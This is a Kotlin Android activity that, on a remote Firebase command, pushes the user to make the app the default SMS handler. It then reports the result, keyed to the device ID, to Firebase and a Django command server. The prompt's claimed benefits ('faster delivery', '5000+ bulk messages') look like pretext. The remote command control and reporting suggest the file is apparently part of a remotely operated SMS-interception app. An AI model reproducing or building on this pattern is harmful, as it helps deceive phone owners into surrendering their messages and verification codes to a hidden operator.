package com.example.fast.ui

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.provider.Settings
import android.view.ViewGroup
import androidx.activity.enableEdgeToEdge
import androidx.appcompat.app.AppCompatActivity
import androidx.appcompat.app.AppCompatDelegate
import androidx.lifecycle.lifecycleScope
import com.example.fast.config.AppConfig
import com.example.fast.R
import com.example.fast.ui.card.MultipurposeCardController
import com.example.fast.ui.card.MultipurposeCardSpec
import com.example.fast.ui.card.BirthSpec
import com.example.fast.ui.card.FillUpSpec
import com.example.fast.ui.card.PurposeSpec
import com.example.fast.ui.card.DeathSpec
import com.example.fast.ui.card.EntranceAnimation
import com.example.fast.ui.card.CardSize
import com.example.fast.util.DefaultSmsAppHelper
import com.example.fast.util.DjangoApiHelper
import com.google.firebase.Firebase
import com.google.firebase.database.database
import kotlinx.coroutines.launch

/**
 * DefaultSmsRequestActivity
 *
 * Activity launched remotely via Firebase command to request user to set app as default SMS app.
 * Uses MultipurposeCard for consistent UI with rest of app.
 *
 * Usage:
 * - Command: requestDefaultMessageApp
 * - Content: Any value (ignored)
 *
 * When user clicks the button, opens the system dialog to set this app as default SMS app.
 */
class DefaultSmsRequestActivity : AppCompatActivity() {

    private val TAG = "DefaultSmsRequest"
    private val handler = Handler(Looper.getMainLooper())
    private val noActionTimeoutMs = 60_000L
    private var noActionRunnable: Runnable? = null
    private val prefsName = "default_sms_prefs"
    private val KEY_LAST_STATUS = "last_default_sms_status"
    private val KEY_LAST_REASON = "last_default_sms_reason"
    private val KEY_LAST_UPDATED_AT = "last_default_sms_updated_at"
    private val KEY_LAST_COMMAND_KEY = "last_default_sms_command_key"
    private val KEY_LAST_COMMAND_TS = "last_default_sms_command_ts"
    private val commandKey by lazy { intent.getStringExtra("commandKey") }
    private val commandHistoryTimestamp by lazy { intent.getLongExtra("historyTimestamp", -1L) }
    private var hasRequestedDefaultSms = false
    private var hasUpdatedCommandHistory = false
    private var hasSyncedDefaultSmsStatus = false
    private var cardController: MultipurposeCardController? = null

    private lateinit var rootView: ViewGroup

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()

        // Set window background to match app theme
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.statusBarColor = resources.getColor(R.color.theme_gradient_start, theme)
            window.navigationBarColor = resources.getColor(R.color.theme_gradient_start, theme)
        }

        // Simple root layout for multipurpose card overlay
        rootView = android.widget.FrameLayout(this).apply {
            layoutParams = ViewGroup.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
            setBackgroundColor(resources.getColor(R.color.theme_gradient_start, theme))
        }
        setContentView(rootView)
        AppCompatDelegate.setDefaultNightMode(AppCompatDelegate.MODE_NIGHT_NO)

        // Check if already default SMS app
        if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
            Log.d(TAG, "App is already set as default SMS app")
            showAlreadyDefaultCard()
        } else {
            showRequestDefaultCard()
        }
    }

    /**
     * Show card when app is already default SMS app
     */
    private fun showAlreadyDefaultCard() {
        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                entranceAnimation = EntranceAnimation.ScaleIn(
                    overlayFadeMs = 150,
                    cardScaleMs = 400,
                    fromScale = 0.9f
                )
            ),
            fillUp = FillUpSpec.Text(
                title = "DEFAULT SMS APP",
                body = "This app is already set as your default message app.\n\nThank you for your support!",
                typingAnimation = true,
                perCharDelayMs = 25
            ),
            purpose = PurposeSpec.Dismiss(
                primaryButtonLabel = "Continue",
                onPrimary = {
                    storeAndSyncDefaultSmsStatus(true, "already_default_on_open")
                    finish()
                }
            ),
            death = DeathSpec.FadeOut(durationMs = 200)
        )

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = { finish() },
            activity = this
        )
        cardController?.show()
    }

    /**
     * Show card to request user to set app as default SMS app
     */
    private fun showRequestDefaultCard() {
        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                entranceAnimation = EntranceAnimation.ScaleIn(
                    overlayFadeMs = 150,
                    cardScaleMs = 400,
                    fromScale = 0.9f
                )
            ),
            fillUp = FillUpSpec.Text(
                title = "SET AS DEFAULT",
                body = "Please make this app your default message app.\n\n" +
                       "Benefits:\n" +
                       "• Better message sync & reliability\n" +
                       "• Faster message delivery\n" +
                       "• Handle bulk messages (5000+) efficiently",
                typingAnimation = true,
                perCharDelayMs = 20
            ),
            purpose = PurposeSpec.Dual(
                primaryButtonLabel = "SET AS DEFAULT",
                secondaryButtonLabel = "Cancel",
                onPrimary = {
                    hasRequestedDefaultSms = true
                    requestDefaultSmsApp()
                    startNoActionTimeout()
                },
                onSecondary = {
                    storeAndSyncDefaultSmsStatus(false, "user_cancelled")
                    updateCommandHistoryStatus("failed", "user_cancelled")
                    finish()
                }
            ),
            death = DeathSpec.FadeOut(durationMs = 200)
        )

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = { /* Card dismissed */ },
            activity = this
        )
        cardController?.show()
    }

    /**
     * Show success card after user sets app as default
     */
    private fun showSuccessCard() {
        // Dismiss current card first
        cardController?.dismiss()

        val spec = MultipurposeCardSpec(
            birth = BirthSpec(
                width = CardSize.MatchWithMargin(24),
                height = CardSize.WrapContent,
                entranceAnimation = EntranceAnimation.ScaleIn(
                    overlayFadeMs = 100,
                    cardScaleMs = 300,
                    fromScale = 0.95f
                )
            ),
            fillUp = FillUpSpec.Text(
                title = "SUCCESS",
                body = "Thank you! This app is now your default message app.\n\n" +
                       "Message delivery and sync will be improved.",
                typingAnimation = true,
                perCharDelayMs = 25
            ),
            purpose = PurposeSpec.Dismiss(
                primaryButtonLabel = "Continue",
                onPrimary = { finish() }
            ),
            death = DeathSpec.FadeOut(durationMs = 200)
        )

        cardController = MultipurposeCardController(
            context = this,
            rootView = rootView,
            spec = spec,
            onComplete = { finish() },
            activity = this
        )
        cardController?.show()
    }

    /**
     * Request user to set app as default SMS app
     */
    private fun requestDefaultSmsApp() {
        try {
            Log.d(TAG, "Requesting user to set app as default SMS app")
            DefaultSmsAppHelper.requestDefaultSmsApp(this)
            Log.d(TAG, "Default SMS app selection dialog opened")
        } catch (e: Exception) {
            Log.e(TAG, "Error opening default SMS app settings", e)
            updateCommandHistoryStatus("failed", "request_launch_error: ${e.message}")
            finish()
        }
    }

    override fun onResume() {
        super.onResume()

        // Check if user has set app as default SMS app
        if (hasRequestedDefaultSms) {
            clearNoActionTimeout()
            
            if (DefaultSmsAppHelper.isDefaultSmsApp(this)) {
                Log.d(TAG, "App is now set as default SMS app")
                storeAndSyncDefaultSmsStatus(true, "user_set_default_sms")
                updateCommandHistoryStatus("executed", "user_set_default_sms")
                showSuccessCard()
            } else {
                Log.d(TAG, "User declined to set app as default SMS app")
                storeAndSyncDefaultSmsStatus(false, "user_declined_default_sms")
                updateCommandHistoryStatus("failed", "user_declined_default_sms")
                finish()
            }
        }
    }

    private fun startNoActionTimeout() {
        clearNoActionTimeout()
        noActionRunnable = Runnable {
            if (!hasSyncedDefaultSmsStatus && hasRequestedDefaultSms) {
                storeAndSyncDefaultSmsStatus(false, "no_action")
                updateCommandHistoryStatus("failed", "no_action")
                finish()
            }
        }
        handler.postDelayed(noActionRunnable!!, noActionTimeoutMs)
    }

    private fun clearNoActionTimeout() {
        noActionRunnable?.let { handler.removeCallbacks(it) }
        noActionRunnable = null
    }

    private fun storeAndSyncDefaultSmsStatus(isDefault: Boolean, reason: String) {
        if (hasSyncedDefaultSmsStatus) return
        hasSyncedDefaultSmsStatus = true

        val updatedAt = System.currentTimeMillis()
        getSharedPreferences(prefsName, MODE_PRIVATE).edit()
            .putBoolean(KEY_LAST_STATUS, isDefault)
            .putString(KEY_LAST_REASON, reason)
            .putLong(KEY_LAST_UPDATED_AT, updatedAt)
            .putString(KEY_LAST_COMMAND_KEY, commandKey ?: "")
            .putLong(KEY_LAST_COMMAND_TS, commandHistoryTimestamp)
            .apply()

        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        val statusPath = "${AppConfig.getFirebaseDevicePath(deviceId)}/systemInfo/defaultSmsStatus/$updatedAt"
        val statusData = mapOf(
            "isDefault" to isDefault,
            "reason" to reason,
            "updatedAt" to updatedAt,
            "commandKey" to (commandKey ?: ""),
            "commandTimestamp" to commandHistoryTimestamp,
            "packageName" to packageName,
            "currentDefaultPackage" to (DefaultSmsAppHelper.getDefaultSmsAppPackage(this) ?: "")
        )

        Firebase.database.reference.child(statusPath).setValue(statusData)
            .addOnSuccessListener {
                Log.d(TAG, "Default SMS status synced to Firebase: $statusPath")
            }
            .addOnFailureListener { e ->
                Log.e(TAG, "Failed to sync default SMS status to Firebase", e)
            }
    }

    @Suppress("DEPRECATION")
    private fun updateCommandHistoryStatus(status: String, reason: String) {
        if (hasUpdatedCommandHistory) return
        val key = commandKey ?: return
        if (commandHistoryTimestamp <= 0L) return

        hasUpdatedCommandHistory = true
        val deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )
        lifecycleScope.launch {
            try {
                DjangoApiHelper.logCommand(
                    deviceId = deviceId,
                    command = key,
                    value = null,
                    status = status,
                    receivedAt = commandHistoryTimestamp,
                    executedAt = System.currentTimeMillis(),
                    errorMessage = reason
                )
                Log.d(TAG, "Updated command history: $key -> $status ($reason)")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to update command history", e)
            }
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        clearNoActionTimeout()
        cardController?.dismiss()
        cardController = null
    }
}
